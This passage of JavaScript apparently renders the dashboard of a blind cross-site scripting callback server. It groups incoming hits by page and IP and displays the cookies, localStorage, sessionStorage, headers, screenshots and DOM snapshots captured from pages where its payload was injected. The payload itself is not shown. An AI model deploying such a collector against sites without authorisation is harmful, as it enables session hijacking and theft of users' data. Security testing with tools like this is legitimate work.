        item.domSnapshot ? item.domSnapshot.length : 0
      ].join("|")).join(";");
      for (let i = 0; i < text.length; i++) {
        hash ^= text.charCodeAt(i);
        hash = Math.imul(hash, 16777619);
      }
      return list.length + ":" + (hash >>> 0);
    }

    function hitKey(item) {
      return [item.receivedAt || "", item.marker || "", item.ip || "", item.pageUrl || item.referrer || ""].join("|");
    }

    function renderCallbacks(callbacks) {
      lastSignature = signatureOf(callbacks);
      const filtered = applyFilters(callbacks);
      const shown = showFetch ? filtered : filtered.filter((item) => !isFetchOnly(item));
      const groups = groupCallbacks(shown);
      const selected = activeGroupKey && groups.some((group) => group.key === activeGroupKey)
        ? groups.find((group) => group.key === activeGroupKey)
        : groups[0];

      if (selected) {
        activeGroupKey = selected.key;
      }

      totalEl.textContent = shown.length;
      uniqueEl.textContent = new Set(shown.map((item) => item.marker).filter(Boolean)).size;
      pagesCountEl.textContent = groups.length;
      pagesMetaEl.textContent = groups.length + (groups.length === 1 ? " page" : " pages");
      document.querySelector("#page-copy").hidden = !selected;
      document.querySelector("#page-delete").hidden = !selected;
      renderGroups(groups, selected && selected.key);

      if (!groups.length) {
        detailsTitleEl.textContent = "Hits";
        detailsSubEl.textContent = filtered.length
          ? "Only fetch-only hits matched — enable Fetch-only to view them."
          : "No hits yet. Inject a payload to get started.";
        callbacksEl.innerHTML = '<div class="empty">' + (filtered.length
          ? "Nothing to show with the current filters."
          : "No callbacks yet. Copy the payload above and inject it into a page.") + '</div>';
        return;
      }

      const detailHits = selected ? selected.hits : groups.flatMap((group) => group.hits);
      detailsTitleEl.textContent = selected ? selected.label : "Hits";
      detailsSubEl.textContent = detailHits.length + (detailHits.length === 1 ? " hit" : " hits") +
        (selected ? " on this page" : "");

      hitIndex = new Map(detailHits.map((item) => [hitKey(item), item]));
      callbacksEl.innerHTML = detailHits.map(renderHit).join("");
      callbacksEl.querySelectorAll(".hit").forEach((card) => {
        const summary = card.querySelector(".hit-summary");
        if (!summary) {
          return;
        }

        summary.addEventListener("click", (event) => {
          if (event.target.closest("a")) {
            return;
          }
          toggleHit(card);
        });
        summary.addEventListener("keydown", (event) => {
          if (event.key === "Enter" || event.key === " ") {
            event.preventDefault();
            toggleHit(card);
          }
        });
      });
    }

    function renderHit(item) {
      const key = hitKey(item);
      const open = expandedHits.has(key);
      const fetchOnly = isFetchOnly(item);
      const sourceLabel = fetchOnly ? "fetch only" : (item.source === "bugatsec-payload" ? "executed" : (item.source || "hit"));
      const pageDisplay = item.pageUrl || item.referrer || "";
      const title = item.title || (fetchOnly ? "Payload loaded" : "Untitled page");
      const detail = open ? renderHitDetail(item) : "";

      return '<article class="hit' + (open ? ' open' : '') + '" data-key="' + escapeAttr(key) + '">' +
        '<div class="hit-summary" role="button" tabindex="0" aria-expanded="' + (open ? 'true' : 'false') + '">' +
          '<div class="hit-main">' +
            '<div class="hit-badges">' +
              '<span class="marker">' + escapeHtml(item.marker || "unknown") + '</span>' +
              '<span class="badge ' + (fetchOnly ? 'fetch' : 'exec') + '">' + escapeHtml(sourceLabel) + '</span>' +
            '</div>' +
            '<div class="hit-title">' + escapeHtml(title) + '</div>' +
            '<div class="hit-url">' + (pageDisplay ? linkify(pageDisplay) : '<span class="muted">no page URL</span>') + '</div>' +
          '</div>' +
          '<div class="hit-side">' +
            '<div class="hit-time">' + escapeHtml(formatTime(item.receivedAt)) + '</div>' +
            (item.ip ? '<div class="hit-ip">' + escapeHtml(item.ip) + '</div>' : '') +
            '<span class="chevron" aria-hidden="true">▾</span>' +
          '</div>' +
        '</div>' +
        '<div class="hit-detail">' + detail + '</div>' +
      '</article>';
    }

    function toggleHit(card) {
      const key = card.dataset.key;
      const isOpen = card.classList.toggle("open");
      const summary = card.querySelector(".hit-summary");
      if (summary) {
        summary.setAttribute("aria-expanded", isOpen ? "true" : "false");
      }

      if (isOpen) {
        expandedHits.add(key);
        const detailEl = card.querySelector(".hit-detail");
        const item = hitIndex.get(key);
        if (detailEl && !detailEl.innerHTML.trim() && item) {
          detailEl.innerHTML = renderHitDetail(item);
        }
      } else {
        expandedHits.delete(key);
      }
    }

    function renderHitDetail(item) {
      const parts = [];

      if (item.domSnapshot && item.domSnapshot.startsWith("data:image")) {
        parts.push('<div class="shot"><img src="' + item.domSnapshot + '" alt="Captured screenshot"></div>');
      }

      const cards = [];
      if (item.cookies) {
        cards.push(detailCard("🍪 Cookies", item.cookies));
      }
      if (item.localStorage) {
        cards.push(detailCard("💾 localStorage", item.localStorage));
      }
      if (item.sessionStorage) {
        cards.push(detailCard(item.source === "payload-load" ? "📋 Request headers" : "💾 sessionStorage", item.sessionStorage));
      }
      if (item.rawBody) {
        cards.push(detailCard("📦 Raw body", item.rawBody));
      }
      if (item.domSnapshot && !item.domSnapshot.startsWith("data:image")) {
        cards.push(detailCard("🌐 DOM snapshot", item.domSnapshot));
      }

      if (cards.length) {
        parts.push('<div class="detail-grid">' + cards.join("") + '</div>');
      }

      const meta = [];
      if (item.title) meta.push(["Title", item.title]);
      if (item.pageUrl) meta.push(["Page URL", item.pageUrl]);
      if (item.referrer) meta.push(["Referrer", item.referrer]);
      if (item.origin) meta.push(["Origin", item.origin]);
      if (item.ip) meta.push(["IP", item.ip]);
      if (item.userAgent) meta.push(["User agent", item.userAgent]);
      if (item.language) meta.push(["Language", item.language]);
      if (item.viewport) meta.push(["Viewport", item.viewport]);
      if (item.windowName) meta.push(["window.name", item.windowName]);
      if (item.source) meta.push(["Source", item.source]);

      if (meta.length) {
        parts.push('<details class="meta"><summary>Metadata</summary><dl>' +
          meta.map((pair) => '<dt>' + escapeHtml(pair[0]) + '</dt><dd>' + escapeHtml(pair[1]) + '</dd>').join("") +
          '</dl></details>');
      }

      if (!parts.length) {
        return '<div class="empty small">No extra data captured for this hit.</div>';
      }

      return parts.join("");
    }

    function detailCard(label, value) {
      return '<div class="detail-card"><h4>' + escapeHtml(label) + '</h4><pre>' + escapeHtml(value) + '</pre></div>';
    }

    function applyFilters(callbacks) {
      const page = filters.page.value.trim().toLowerCase();
      const ip = filters.ip.value.trim().toLowerCase();
      const marker = filters.marker.value.trim().toLowerCase();

      return callbacks.filter((item) => {
        const pageValue = pageKey(item).toLowerCase();
        const ipValue = String(item.ip || "").toLowerCase();
        const markerValue = String(item.marker || "").toLowerCase();

        return (!page || pageValue.includes(page)) &&
          (!ip || ipValue.includes(ip)) &&
          (!marker || markerValue.includes(marker));
      });
    }

    function groupCallbacks(callbacks) {
      const byPage = new Map();
      callbacks.forEach((item) => {
        const key = pageKey(item);
        if (!byPage.has(key)) {
          byPage.set(key, []);
        }
        byPage.get(key).push(item);
      });

      return Array.from(byPage.entries()).map(([key, hits]) => {
        const sortedHits = hits.slice().sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        const uniqueIps = new Set(sortedHits.map((item) => item.ip).filter(Boolean)).size;
        const uniqueMarkers = new Set(sortedHits.map((item) => item.marker).filter(Boolean)).size;
        return {
          key,
          label: pageLabel(key),
          hits: sortedHits,
          uniqueIps,
          uniqueMarkers,
          lastHit: sortedHits[0] && sortedHits[0].receivedAt
        };
      }).sort((a, b) => new Date(b.lastHit) - new Date(a.lastHit));
    }

    function renderGroups(groups, selectedKey) {
      if (!groups.length) {
        groupsEl.innerHTML = '<div class="empty small">No matching pages.</div>';
        return;
      }

      groupsEl.innerHTML = groups.map((group) => {
        return '<button class="group-card' + (group.key === selectedKey ? ' active' : '') + '" data-key="' + escapeAttr(group.key) + '" type="button">' +
          '<span class="group-title">' + escapeHtml(group.label) + '</span>' +
          '<span class="group-meta">' + group.hits.length + (group.hits.length === 1 ? " hit" : " hits") +
            ' · ' + group.uniqueIps + ' IP' + (group.uniqueIps === 1 ? "" : "s") +
            ' · ' + escapeHtml(formatTime(group.lastHit)) + '</span>' +
        '</button>';
      }).join("");

      groupsEl.querySelectorAll(".group-card").forEach((button) => {
        button.addEventListener("click", () => {
          activeGroupKey = button.dataset.key;
          renderCallbacks(allCallbacks);
        });
      });
    }

    function updateSuggestions(callbacks) {
      const groups = groupCallbacks(callbacks);
      pageSuggestionsEl.innerHTML = groups.map((group) => {
        return '<option value="' + escapeAttr(group.key) + '">' + escapeHtml(group.label) + '</option>';
      }).join("");
      ipSuggestionsEl.innerHTML = Array.from(new Set(callbacks.map((item) => item.ip).filter(Boolean)))
        .sort()
        .map((ip) => '<option value="' + escapeAttr(ip) + '"></option>')
        .join("");
      markerSuggestionsEl.innerHTML = Array.from(new Set(callbacks.map((item) => item.marker).filter(Boolean)))
        .sort()
        .map((marker) => '<option value="' + escapeAttr(marker) + '"></option>')
        .join("");
    }

    function pageKey(item) {
      return String(item.pageUrl || item.referrer || "Unknown page");
    }

    function isFetchOnly(item) {
      return item.source === "payload-load" || item.source === "image";
    }

    function pageLabel(value) {
      if (value === "Unknown page") {
        return value;
      }

      try {
        const url = new URL(value);
        return url.hostname + (url.pathname === "/" ? "" : url.pathname);
      } catch {
        return value;
      }
    }

    function formatTime(value) {
      if (!value) return "";
      const date = new Date(value);
      return Number.isNaN(date.getTime()) ? value : date.toLocaleString();
    }

    function linkify(value) {
      if (!value) return "";
      const safe = escapeHtml(value);
      if (!/^https?:\\/\\//i.test(value)) return safe;
      return '<a href="' + safe + '" target="_blank" rel="noreferrer" style="color: var(--blue);">' + safe + '</a>';
    }

    function escapeHtml(value) {
      return String(value).replace(/[&<>"']/g, (char) => ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      })[char]);
    }

    function escapeAttr(value) {
      return escapeHtml(value).replace(new RegExp(String.fromCharCode(96), "g"), "&#96;");
    }

    updatePayload();
    loadCallbacks();
    setInterval(loadCallbacks, 5000);
  </script>
</body>
</html>`;
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  })[char]);
}